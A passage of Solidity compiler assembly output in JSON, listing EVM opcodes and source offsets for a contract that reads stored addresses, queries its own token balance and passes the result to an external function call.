										{
											"begin": 1612,
											"end": 1683,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "41"
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 1612,
											"end": 1683,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "tag",
											"source": 4,
											"value": "41"
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "EXTCODESIZE",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "43"
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "tag",
											"source": 4,
											"value": "43"
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "45"
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "tag",
											"source": 4,
											"value": "45"
										},
										{
											"begin": 1612,
											"end": 1683,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1700,
											"end": 1703,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 1700,
											"end": 1703,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1700,
											"end": 1703,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 1710,
											"end": 1716,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1700,
											"end": 1703,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1718,
											"end": 1724,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1759,
											"end": 1763,
											"name": "ADDRESS",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1401,
											"end": 1452,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 1700,
											"end": 1703,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1700,
											"end": 1703,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1700,
											"end": 1703,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1700,
											"end": 1703,
											"name": "SWAP6",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1695,
											"end": 1709,
											"name": "PUSH",
											"source": 4,
											"value": "DF791E50"
										},
										{
											"begin": 1695,
											"end": 1709,
											"name": "SWAP5",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1710,
											"end": 1716,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1710,
											"end": 1716,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1710,
											"end": 1716,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1710,
											"end": 1716,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1718,
											"end": 1724,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1718,
											"end": 1724,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1710,
											"end": 1716,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1710,
											"end": 1716,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1750,
											"name": "PUSH",
											"source": 4,
											"value": "70A08231"
										},
										{
											"begin": 1726,
											"end": 1750,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "DUP7",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "STATICCALL",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "48"
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "tag",
											"source": 4,
											"value": "48"
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "49"
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1726,
											"end": 1765,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "tag",
											"source": 4,
											"value": "49"
										},
										{
											"begin": 1726,
											"end": 1765,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "SHL",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "50"
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 1695,
											"end": 1766,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "tag",
											"source": 4,
											"value": "50"
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "EXTCODESIZE",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "51"
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "tag",
											"source": 4,
											"value": "51"
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "53"
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "tag",
											"source": 4,
											"value": "53"
										},
										{
											"begin": 1695,
											"end": 1766,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1781,
											"end": 1784,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 1781,
											"end": 1784,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1781,
											"end": 1784,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1791,
											"end": 1797,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1781,
											"end": 1784,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 1799,
											"end": 1805,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1840,
											"end": 1844,
											"name": "ADDRESS",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1401,
											"end": 1452,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 1781,
											"end": 1784,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1781,
											"end": 1784,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1781,
											"end": 1784,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1781,
											"end": 1784,
											"name": "SWAP6",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1776,
											"end": 1790,
											"name": "PUSH",
											"source": 4,
											"value": "DF791E50"
										},
										{
											"begin": 1776,
											"end": 1790,
											"name": "SWAP5",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1791,
											"end": 1797,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1791,
											"end": 1797,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1791,
											"end": 1797,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1791,
											"end": 1797,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1799,
											"end": 1805,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1799,
											"end": 1805,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1791,
											"end": 1797,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1791,
											"end": 1797,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1831,
											"name": "PUSH",
											"source": 4,
											"value": "70A08231"
										},
										{
											"begin": 1807,
											"end": 1831,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "DUP7",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "STATICCALL",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "56"
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "tag",
											"source": 4,
											"value": "56"
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "57"
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1807,
											"end": 1846,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "tag",
											"source": 4,
											"value": "57"
										},
										{
											"begin": 1807,
											"end": 1846,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "SHL",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "58"
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 1776,
											"end": 1847,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "tag",
											"source": 4,
											"value": "58"
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
